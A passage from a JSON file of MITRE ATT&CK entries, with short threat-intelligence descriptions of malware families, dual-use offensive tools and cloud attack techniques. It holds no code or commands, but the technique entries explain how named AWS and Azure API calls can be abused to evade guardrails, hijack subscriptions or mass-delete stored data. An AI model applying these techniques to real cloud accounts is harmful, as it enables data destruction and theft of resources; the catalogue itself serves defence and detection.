    "description": "[SYSCON](https://attack.mitre.org/software/S0464) is a backdoor that has been in use since at least 2017 and has been associated with campaigns involving North Korean themes. [SYSCON](https://attack.mitre.org/software/S0464) has been delivered by the [CARROTBALL](https://attack.mitre.org/software/S0465) and [CARROTBAT](https://attack.mitre.org/software/S0462) droppers.(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SYSCON"
    ],
    "id": "S0464"
  },
  "malware--eedc01d5-95e6-4d21-bcd4-1121b1df4586": {
    "name": "CookieMiner",
    "description": "[CookieMiner](https://attack.mitre.org/software/S0492) is mac-based malware that targets information associated with cryptocurrency exchanges as well as enabling cryptocurrency mining on the victim system itself. It was first discovered in the wild in 2019.(Citation: Unit42 CookieMiner Jan 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CookieMiner"
    ],
    "id": "S0492"
  },
  "malware--ef2247bf-8062-404b-894f-d65d00564817": {
    "name": "Hancitor",
    "description": "[Hancitor](https://attack.mitre.org/software/S0499) is a downloader that has been used by [Pony](https://attack.mitre.org/software/S0453) and other information stealing malware.(Citation: Threatpost Hancitor)(Citation: FireEye Hancitor)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Hancitor"
    ],
    "id": "S0499"
  },
  "malware--efa7c4d6-8e30-41d9-a8fd-26dc337f4a1b": {
    "name": "Gelsemium",
    "description": "[Gelsemium](https://attack.mitre.org/software/S0666) is a modular malware comprised of a dropper (Gelsemine), a loader (Gelsenicine), and main (Gelsevirine) plug-ins written using the Microsoft Foundation Class (MFC) framework. [Gelsemium](https://attack.mitre.org/software/S0666) has been used by the Gelsemium group since at least 2014.(Citation: ESET Gelsemium June 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Gelsemium"
    ],
    "id": "S0666"
  },
  "malware--f01e2711-4b48-4192-a2e8-5f56c945ca19": {
    "name": "Dridex",
    "description": "[Dridex](https://attack.mitre.org/software/S0384) is a prolific banking Trojan that first appeared in 2014. By December 2019, the US Treasury estimated [Dridex](https://attack.mitre.org/software/S0384) had infected computers in hundreds of banks and financial institutions in over 40 countries, leading to more than $100 million in theft. [Dridex](https://attack.mitre.org/software/S0384) was created from the source code of the Bugat banking Trojan (also known as Cridex).(Citation: Dell Dridex Oct 2015)(Citation: Kaspersky Dridex May 2017)(Citation: Treasury EvilCorp Dec 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Dridex"
    ],
    "id": "S0384"
  },
  "malware--f0fc920e-57a3-4af5-89be-9ea594c8b1ea": {
    "name": "BBK",
    "description": "[BBK](https://attack.mitre.org/software/S0470) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BBK"
    ],
    "id": "S0470"
  },
  "malware--f1314e75-ada8-49f4-b281-b1fb8b48f2a7": {
    "name": "OSX/Shlayer",
    "description": "[OSX/Shlayer](https://attack.mitre.org/software/S0402) is a Trojan designed to install adware on macOS that was first discovered in 2018.(Citation: Carbon Black Shlayer Feb 2019)(Citation: Intego Shlayer Feb 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "OSX/Shlayer"
    ],
    "id": "S0402"
  },
  "malware--f3f1fbed-7e29-49cb-8579-4a378f858deb": {
    "name": "Waterbear",
    "description": "[Waterbear](https://attack.mitre.org/software/S0579) is modular malware attributed to [BlackTech](https://attack.mitre.org/groups/G0098) that has been used primarily for lateral movement, decrypting, and triggering payloads and is capable of hiding network behaviors.(Citation: Trend Micro Waterbear December 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Waterbear"
    ],
    "id": "S0579"
  },
  "malware--f464354c-7103-47c6-969b-8766f0157ed2": {
    "name": "FIVEHANDS",
    "description": "[FIVEHANDS](https://attack.mitre.org/software/S0618) is a customized version of [DEATHRANSOM](https://attack.mitre.org/software/S0616) ransomware written in C++. [FIVEHANDS](https://attack.mitre.org/software/S0618) has been used since at least 2021, including in Ransomware-as-a-Service (RaaS) campaigns, sometimes along with [SombRAT](https://attack.mitre.org/software/S0615).(Citation: FireEye FiveHands April 2021)(Citation: NCC Group Fivehands June 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FIVEHANDS"
    ],
    "id": "S0618"
  },
  "malware--f559f945-eb8b-48b1-904c-68568deebed3": {
    "name": "JSS Loader",
    "description": "[JSS Loader](https://attack.mitre.org/software/S0648) is Remote Access Trojan (RAT) with .NET and C++ variants that has been used by [FIN7](https://attack.mitre.org/groups/G0046) since at least 2020.(Citation: eSentire FIN7 July 2021)(Citation: CrowdStrike Carbon Spider August 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "JSS Loader"
    ],
    "id": "S0648"
  },
  "malware--f74a5069-015d-4404-83ad-5ca01056c0dc": {
    "name": "Lizar",
    "description": "[Lizar](https://attack.mitre.org/software/S0681) is a modular remote access tool written using the .NET Framework that shares structural similarities to [Carbanak](https://attack.mitre.org/software/S0030). It has likely been used by [FIN7](https://attack.mitre.org/groups/G0046) since at least February 2021.(Citation: BiZone Lizar May 2021)(Citation: Threatpost Lizar May 2021)(Citation: Gemini FIN7 Oct 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Lizar"
    ],
    "id": "S0681"
  },
  "malware--f8774023-8021-4ece-9aca-383ac89d2759": {
    "name": "Dtrack",
    "description": "[Dtrack](https://attack.mitre.org/software/S0567) is spyware that was discovered in 2019 and has been used against Indian financial institutions, research facilities, and the Kudankulam Nuclear Power Plant. [Dtrack](https://attack.mitre.org/software/S0567) shares similarities with the DarkSeoul campaign, which was attributed to [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: Kaspersky Dtrack)(Citation: Securelist Dtrack)(Citation: Dragos WASSONITE)(Citation: CyberBit Dtrack)(Citation: ZDNet Dtrack)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Dtrack"
    ],
    "id": "S0567"
  },
  "malware--f8fc98ac-ad6d-44db-b6e2-f0c6eb4eace4": {
    "name": "SLOWPULSE",
    "description": "[SLOWPULSE](https://attack.mitre.org/software/S1104) is a malware that was used by [APT5](https://attack.mitre.org/groups/G1023) as early as 2020 including against U.S. Defense Industrial Base (DIB) companies. [SLOWPULSE](https://attack.mitre.org/software/S1104) has several variants and can modify legitimate Pulse Secure VPN files in order to log credentials and bypass single and two-factor authentication flows.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SLOWPULSE"
    ],
    "id": "S1104"
  },
  "malware--f931a0b9-0361-4b1b-bacf-955062c35746": {
    "name": "Seth-Locker",
    "description": "[Seth-Locker](https://attack.mitre.org/software/S0639) is a ransomware with some remote control capabilities that has been in use since at least 2021.\n(Citation: Trend Micro Ransomware February 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Seth-Locker"
    ],
    "id": "S0639"
  },
  "malware--f99f3dcc-683f-4936-8791-075ac5e58f10": {
    "name": "LoudMiner",
    "description": "[LoudMiner](https://attack.mitre.org/software/S0451) is a cryptocurrency miner which uses virtualization software to siphon system resources. The miner has been bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.(Citation: ESET LoudMiner June 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LoudMiner"
    ],
    "id": "S0451"
  },
  "malware--fa766a65-5136-4ff3-8429-36d08eaa0100": {
    "name": "BitPaymer",
    "description": "[BitPaymer](https://attack.mitre.org/software/S0570) is a ransomware variant first observed in August 2017 targeting hospitals in the U.K. [BitPaymer](https://attack.mitre.org/software/S0570) uses a unique encryption key, ransom note, and contact information for each operation. [BitPaymer](https://attack.mitre.org/software/S0570) has several indicators suggesting overlap with the [Dridex](https://attack.mitre.org/software/S0384) malware and is often delivered via [Dridex](https://attack.mitre.org/software/S0384).(Citation: Crowdstrike Indrik November 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BitPaymer"
    ],
    "id": "S0570"
  },
  "malware--fb28627c-d6ea-4c35-b138-ab5e96ae5445": {
    "name": "Zox",
    "description": "[Zox](https://attack.mitre.org/software/S0672) is a remote access tool that has been used by [Axiom](https://attack.mitre.org/groups/G0001) since at least 2008.(Citation: Novetta-Axiom)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Zox"
    ],
    "id": "S0672"
  },
  "malware--fb78294a-7d7a-4d38-8ad0-92e67fddc9f0": {
    "name": "StrifeWater",
    "description": "[StrifeWater](https://attack.mitre.org/software/S1034) is a remote-access tool that has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) in the initial stages of their attacks since at least November 2021.(Citation: Cybereason StrifeWater Feb 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "StrifeWater"
    ],
    "id": "S1034"
  },
  "malware--fc774af4-533b-4724-96d2-ac1026316794": {
    "name": "HiddenWasp",
    "description": "[HiddenWasp](https://attack.mitre.org/software/S0394) is a Linux-based Trojan used to target systems for remote control. It comes in the form of a statically linked ELF binary with stdlibc++.(Citation: Intezer HiddenWasp Map 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HiddenWasp"
    ],
    "id": "S0394"
  },
  "malware--fde19a18-e502-467f-be14-58c71b4e7f4b": {
    "name": "WarzoneRAT",
    "description": "[WarzoneRAT](https://attack.mitre.org/software/S0670) is a malware-as-a-service remote access tool (RAT) written in C++ that has been publicly available for purchase since at least late 2018.(Citation: Check Point Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "WarzoneRAT"
    ],
    "id": "S0670"
  },
  "malware--feb2d7bb-aacb-48df-ad04-ccf41a30cd90": {
    "name": "SLOTHFULMEDIA",
    "description": "[SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) is a remote access Trojan written in C++ that has been used by an unidentified \"sophisticated cyber actor\" since at least January 2017.(Citation: CISA MAR SLOTHFULMEDIA October 2020)(Citation: Costin Raiu IAmTheKing October 2020) It has been used to target government organizations, defense contractors, universities, and energy companies in Russia, India, Kazakhstan, Kyrgyzstan, Malaysia, Ukraine, and Eastern Europe.(Citation: USCYBERCOM SLOTHFULMEDIA October 2020)(Citation: Kaspersky IAmTheKing October 2020)  \n\nIn October 2020, Kaspersky Labs assessed [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) is part of an activity cluster it refers to as \"IAmTheKing\".(Citation: Kaspersky IAmTheKing October 2020) ESET also noted code similarity between [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) and droppers used by a group it refers to as \"PowerPool\".(Citation: ESET PowerPool Code October 2020) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SLOTHFULMEDIA"
    ],
    "id": "S0533"
  },
  "malware--ff41b9b6-4c1d-407b-a7e2-835109c8dbc5": {
    "name": "Small Sieve",
    "description": "[Small Sieve](https://attack.mitre.org/software/S1035) is a Telegram Bot API-based Python backdoor that has been distributed using a Nullsoft Scriptable Install System (NSIS) Installer; it has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least January 2022.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: NCSC GCHQ Small Sieve Jan 2022)\n\nSecurity researchers have also noted [Small Sieve](https://attack.mitre.org/software/S1035)'s use by UNC3313, which may be associated with [MuddyWater](https://attack.mitre.org/groups/G0069).(Citation: Mandiant UNC3313 Feb 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Small Sieve"
    ],
    "id": "S1035"
  },
  "malware--ff7ed9c1-dca3-4e62-9da6-72c5d388b8fa": {
    "name": "HermeticWizard",
    "description": "[HermeticWizard](https://attack.mitre.org/software/S0698) is a worm that has been used to spread [HermeticWiper](https://attack.mitre.org/software/S0697) in attacks against organizations in Ukraine since at least 2022.(Citation: ESET Hermetic Wizard March 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HermeticWizard"
    ],
    "id": "S0698"
  },
  "malware--41e3fd01-7b83-471f-835d-d2b1dc9a770c": {
    "name": "Twitoor",
    "description": "[Twitoor](https://attack.mitre.org/software/S0302) is a dropper application capable of receiving commands from social media.(Citation: ESET-Twitoor)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Twitoor"
    ],
    "id": "S0302"
  },
  "tool--03c6e0ea-96d3-4b23-9afb-05055663cf4b": {
    "name": "RemoteUtilities",
    "description": "[RemoteUtilities](https://attack.mitre.org/software/S0592) is a legitimate remote administration tool that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2021 for execution on target machines.(Citation: Trend Micro Muddy Water March 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RemoteUtilities"
    ],
    "id": "S0592"
  },
  "tool--066b057c-944e-4cfc-b654-e3dfba04b926": {
    "name": "BloodHound",
    "description": "[BloodHound](https://attack.mitre.org/software/S0521) is an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.(Citation: GitHub Bloodhound)(Citation: CrowdStrike BloodHound April 2018)(Citation: FoxIT Wocao December 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BloodHound"
    ],
    "id": "S0521"
  },
  "tool--115f88dd-0618-4389-83cb-98d33ae81848": {
    "name": "ShimRatReporter",
    "description": "[ShimRatReporter](https://attack.mitre.org/software/S0445) is a tool used by suspected Chinese adversary [Mofang](https://attack.mitre.org/groups/G0103) to automatically conduct initial discovery. The details from this discovery are used to customize follow-on payloads (such as [ShimRat](https://attack.mitre.org/software/S0444)) as well as set up faux infrastructure which mimics the adversary's targets. [ShimRatReporter](https://attack.mitre.org/software/S0445) has been used in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development.(Citation: FOX-IT May 2016 Mofang)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ShimRatReporter"
    ],
    "id": "S0445"
  },
  "tool--11f8d7eb-1927-4806-9267-3a11d4d4d6be": {
    "name": "Sliver",
    "description": "[Sliver](https://attack.mitre.org/software/S0633) is an open source, cross-platform, red team command and control (C2) framework written in Golang. [Sliver](https://attack.mitre.org/software/S0633) includes its own package manager, \"armory,\" for staging and downloading additional tools and payloads to the primary C2 framework.(Citation: Bishop Fox Sliver Framework August 2019)(Citation: Cybereason Sliver Undated)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Sliver"
    ],
    "id": "S0633"
  },
  "tool--1244e058-fa10-48cb-b484-0bcf671107ae": {
    "name": "SILENTTRINITY",
    "description": "[SILENTTRINITY](https://attack.mitre.org/software/S0692) is an open source remote administration and post-exploitation framework primarily written in Python that includes stagers written in Powershell, C, and Boo. [SILENTTRINITY](https://attack.mitre.org/software/S0692) was used in a 2019 campaign against Croatian government agencies by unidentified cyber actors.(Citation: GitHub SILENTTRINITY March 2022)(Citation: Security Affairs SILENTTRINITY July 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SILENTTRINITY"
    ],
    "id": "S0692"
  },
  "tool--1b3b8f96-43b1-4460-8e02-1f53d7802fb9": {
    "name": "Pacu",
    "description": "Pacu is an open-source AWS exploitation framework. The tool is written in Python and publicly available on GitHub.(Citation: GitHub Pacu)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Pacu"
    ],
    "id": "S1091"
  },
  "tool--2c5281dd-b5fd-4531-8aea-c1bf8a0f8756": {
    "name": "AADInternals",
    "description": "[AADInternals](https://attack.mitre.org/software/S0677) is a PowerShell-based framework for administering, enumerating, and exploiting Azure Active Directory. The tool is publicly available on GitHub.(Citation: AADInternals Github)(Citation: AADInternals Documentation)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AADInternals"
    ],
    "id": "S0677"
  },
  "tool--2f7f03bb-f367-4a5a-ad9b-310a12a48906": {
    "name": "ngrok",
    "description": "[ngrok](https://attack.mitre.org/software/S0508) is a legitimate reverse proxy tool that can create a secure tunnel to servers located behind firewalls or on local machines that do not have a public IP. [ngrok](https://attack.mitre.org/software/S0508) has been leveraged by threat actors in several campaigns including use for lateral movement and data exfiltration.(Citation: Zdnet Ngrok September 2018)(Citation: FireEye Maze May 2020)(Citation: Cyware Ngrok May 2019)(Citation: MalwareBytes LazyScripter Feb 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ngrok"
    ],
    "id": "S0508"
  },
  "tool--3a53b207-aba2-4a2b-9cdb-273d633669e7": {
    "name": "PcShare",
    "description": "[PcShare](https://attack.mitre.org/software/S1050) is an open source remote access tool that has been modified and used by Chinese threat actors, most notably during the FunnyDream campaign since late 2018.(Citation: Bitdefender FunnyDream Campaign November 2020)(Citation: GitHub PcShare 2014)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PcShare"
    ],
    "id": "S1050"
  },
  "tool--5256c0f8-9108-4c92-8b09-482dfacdcd94": {
    "name": "CSPY Downloader",
    "description": "[CSPY Downloader](https://attack.mitre.org/software/S0527) is a tool designed to evade analysis and download additional payloads used by [Kimsuky](https://attack.mitre.org/groups/G0094).(Citation: Cybereason Kimsuky November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CSPY Downloader"
    ],
    "id": "S0527"
  },
  "tool--59096109-a1dd-463b-87e7-a8d110fe3a79": {
    "name": "Rclone",
    "description": "[Rclone](https://attack.mitre.org/software/S1040) is a command line program for syncing files with cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA. [Rclone](https://attack.mitre.org/software/S1040) has been used in a number of ransomware campaigns, including those associated with the [Conti](https://attack.mitre.org/software/S0575) and DarkSide Ransomware-as-a-Service operations.(Citation: Rclone)(Citation: Rclone Wars)(Citation: Detecting Rclone)(Citation: DarkSide Ransomware Gang)(Citation: DFIR Conti Bazar Nov 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Rclone"
    ],
    "id": "S1040"
  },
  "tool--5fc81b43-62b5-41b1-9113-c79ae5f030c4": {
    "name": "CARROTBALL",
    "description": "[CARROTBALL](https://attack.mitre.org/software/S0465) is an FTP downloader utility that has been in use since at least 2019. [CARROTBALL](https://attack.mitre.org/software/S0465) has been used as a downloader to install [SYSCON](https://attack.mitre.org/software/S0464).(Citation: Unit 42 CARROTBAT January 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CARROTBALL"
    ],
    "id": "S0465"
  },
  "tool--6a5947f3-1a36-4653-8734-526df3e1d28d": {
    "name": "AsyncRAT",
    "description": "[AsyncRAT](https://attack.mitre.org/software/S1087) is an open-source remote access tool originally available through the NYANxCAT Github repository that has been used in malicious campaigns.(Citation: Morphisec Snip3 May 2021)(Citation: Cisco Operation Layover September 2021)(Citation: Telefonica Snip3 December 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AsyncRAT"
    ],
    "id": "S1087"
  },
  "tool--6dbdc657-d8e0-4f2f-909b-7251b3e72c6d": {
    "name": "ROADTools",
    "description": "[ROADTools](https://attack.mitre.org/software/S0684) is a framework for enumerating Azure Active Directory environments. The tool is written in Python and publicly available on GitHub.(Citation: ROADtools Github)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ROADTools"
    ],
    "id": "S0684"
  },
  "tool--75d8b521-6b6a-42ff-8af3-d97e20ce12a5": {
    "name": "Brute Ratel C4",
    "description": "[Brute Ratel C4](https://attack.mitre.org/software/S1063) is a commercial red-teaming and adversarial attack simulation tool that first appeared in December 2020. [Brute Ratel C4](https://attack.mitre.org/software/S1063) was specifically designed to avoid detection by endpoint detection and response (EDR) and antivirus (AV) capabilities, and deploys agents called badgers to enable arbitrary command execution for lateral movement, privilege escalation, and persistence. In September 2022, a cracked version of [Brute Ratel C4](https://attack.mitre.org/software/S1063) was leaked in the cybercriminal underground, leading to its use by threat actors.(Citation: Dark Vortex Brute Ratel C4)(Citation: Palo Alto Brute Ratel July 2022)(Citation: MDSec Brute Ratel August 2022)(Citation: SANS Brute Ratel October 2022)(Citation: Trend Micro Black Basta October 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Brute Ratel C4"
    ],
    "id": "S1063"
  },
  "tool--79dd477a-8226-4b3d-ad15-28623675f221": {
    "name": "Peirates",
    "description": "[Peirates](https://attack.mitre.org/software/S0683) is a post-exploitation Kubernetes exploitation framework with a focus on gathering service account tokens for lateral movement and privilege escalation. The tool is written in GoLang and publicly available on GitHub.(Citation: Peirates GitHub)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Peirates"
    ],
    "id": "S0683"
  },
  "tool--80c815bb-b24a-4b9c-9d73-ff4c075a278d": {
    "name": "Out1",
    "description": "[Out1](https://attack.mitre.org/software/S0594) is a remote access tool written in python and used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2021.(Citation: Trend Micro Muddy Water March 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Out1"
    ],
    "id": "S0594"
  },
  "tool--842976c7-f9c8-41b2-8371-41dc64fbe261": {
    "name": "ConnectWise",
    "description": "[ConnectWise](https://attack.mitre.org/software/S0591) is a legitimate remote administration tool that has been used since at least 2016 by threat actors including [MuddyWater](https://attack.mitre.org/groups/G0069) and [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) to connect to and conduct lateral movement in target environments.(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ConnectWise"
    ],
    "id": "S0591"
  },
  "tool--8f8cd191-902c-4e83-bf20-b57c8c4640e9": {
    "name": "Imminent Monitor",
    "description": "[Imminent Monitor](https://attack.mitre.org/software/S0434) was a commodity remote access tool (RAT) offered for sale from 2012 until 2019, when an operation was conducted to take down the Imminent Monitor infrastructure. Various cracked versions and variations of this RAT are still in circulation.(Citation: Imminent Unit42 Dec2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Imminent Monitor"
    ],
    "id": "S0434"
  },
  "tool--975737f1-b10d-476f-8bda-3ec26ea57172": {
    "name": "MCMD",
    "description": "[MCMD](https://attack.mitre.org/software/S0500) is a remote access tool that provides remote command shell capability used by [Dragonfly 2.0](https://attack.mitre.org/groups/G0074).(Citation: Secureworks MCMD July 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MCMD"
    ],
    "id": "S0500"
  },
  "tool--999c4e6e-b8dc-4b4f-8d6e-1b829f29997e": {
    "name": "MailSniper",
    "description": "MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used by a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.(Citation: GitHub MailSniper)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MailSniper"
    ],
    "id": "S0413"
  },
  "tool--a7b5df47-73bb-4d47-b701-869f185633a6": {
    "name": "Donut",
    "description": "[Donut](https://attack.mitre.org/software/S0695) is an open source framework used to generate position-independent shellcode.(Citation: Donut Github)(Citation: Introducing Donut) [Donut](https://attack.mitre.org/software/S0695) generated code has been used by multiple threat actors to inject and load malicious payloads into memory.(Citation: NCC Group WastedLocker June 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Donut"
    ],
    "id": "S0695"
  },
  "tool--b1595ddd-a783-482a-90e1-8afc8d48467e": {
    "name": "IronNetInjector",
    "description": "[IronNetInjector](https://attack.mitre.org/software/S0581) is a [Turla](https://attack.mitre.org/groups/G0010) toolchain that utilizes scripts from the open-source IronPython implementation of Python with a .NET injector to drop one or more payloads including [ComRAT](https://attack.mitre.org/software/S0126).(Citation: Unit 42 IronNetInjector February 2021 )",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "IronNetInjector"
    ],
    "id": "S0581"
  },
  "tool--b63970b7-ddfb-4aee-97b1-80d335e033a8": {
    "name": "NBTscan",
    "description": "[NBTscan](https://attack.mitre.org/software/S0590) is an open source tool that has been used by state groups to conduct internal reconnaissance within a compromised network.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)(Citation: Symantec Waterbug Jun 2019)(Citation: FireEye APT39 Jan 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "NBTscan"
    ],
    "id": "S0590"
  },
  "tool--c256da91-6dd5-40b2-beeb-ee3b22ab3d27": {
    "name": "esentutl",
    "description": "[esentutl](https://attack.mitre.org/software/S0404) is a command-line tool that provides database utilities for the Windows Extensible Storage Engine.(Citation: Microsoft Esentutl)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "esentutl"
    ],
    "id": "S0404"
  },
  "tool--c4810609-7da6-48ec-8057-1b70a7814db0": {
    "name": "CrackMapExec",
    "description": "[CrackMapExec](https://attack.mitre.org/software/S0488), or CME, is a post-exploitation tool developed in Python and designed for penetration testing against networks. [CrackMapExec](https://attack.mitre.org/software/S0488) collects Active Directory information to conduct lateral movement through targeted networks.(Citation: CME Github September 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CrackMapExec"
    ],
    "id": "S0488"
  },
  "tool--d505fc8b-2e64-46eb-96d6-9ef7ffca5b66": {
    "name": "Mythic",
    "description": "[Mythic](https://attack.mitre.org/software/S0699) is an open source, cross-platform post-exploitation/command and control platform. [Mythic](https://attack.mitre.org/software/S0699) is designed to \"plug-n-play\" with various agents and communication channels.(Citation: Mythic Github)(Citation: Mythic SpecterOps)(Citation: Mythc Documentation) Deployed [Mythic](https://attack.mitre.org/software/S0699) C2 servers have been observed as part of potentially malicious infrastructure.(Citation: RecordedFuture 2021 Ad Infra)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Mythic"
    ],
    "id": "S0699"
  },
  "tool--e33267fe-099f-4af2-8730-63d49f8813b2": {
    "name": "Rubeus",
    "description": "[Rubeus](https://attack.mitre.org/software/S1071) is a C# toolset designed for raw Kerberos interaction that has been used since at least 2020, including in ransomware operations.(Citation: GitHub Rubeus March 2023)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed Run November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Rubeus"
    ],
    "id": "S1071"
  },
  "tool--f59508a6-3615-47c3-b493-6676e1a39a87": {
    "name": "AdFind",
    "description": "[AdFind](https://attack.mitre.org/software/S0552) is a free command-line query tool that can be used for gathering information from Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AdFind"
    ],
    "id": "S0552"
  },
  "tool--f91162cc-1686-4ff8-8115-bf3f61a4cc7a": {
    "name": "Wevtutil",
    "description": "[Wevtutil](https://attack.mitre.org/software/S0645) is a Windows command-line utility that enables administrators to retrieve information about event logs and publishers.(Citation: Wevtutil Microsoft Documentation)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Wevtutil"
    ],
    "id": "S0645"
  },
  "attack-pattern--0ce73446-8722-4086-9d43-514f1d0f669e": {
    "name": "Modify Cloud Resource Hierarchy",
    "example_uses": [],
    "description": "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.  IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.(Citation: AWS Organizations)(Citation: Microsoft Azure Resources)Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victims compute resources without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm 2023)(Citation: Microsoft Subscription Hijacking 2022)In AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)",
    "similar_words": [
      "Modify Cloud Resource Hierarchy"
    ],
    "id": "T1666"
  },
  "attack-pattern--1001e0d6-ee09-4dfc-aa90-e9320ffc8fe4": {
    "name": "Lifecycle-Triggered Deletion",
    "example_uses": [],
    "description": "Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.  Cloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation: GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once. For example, in AWS environments, an adversary with the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle` API call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day.(Citation: Palo Alto Cloud Ransomware)(Citation: Halcyon AWS Ransomware 2025) In addition to destroying data for purposes of extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657), adversaries may also perform this action on buckets storing cloud logs for [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation: Datadog S3 Lifecycle CloudTrail Logs)",
    "similar_words": [
      "Lifecycle-Triggered Deletion"
    ],
    "id": "T1485.001"
  },
  "attack-pattern--130d4494-b2d6-4040-bcea-6e59f05222fe": {
    "name": "SMS Pumping",
    "example_uses": [],
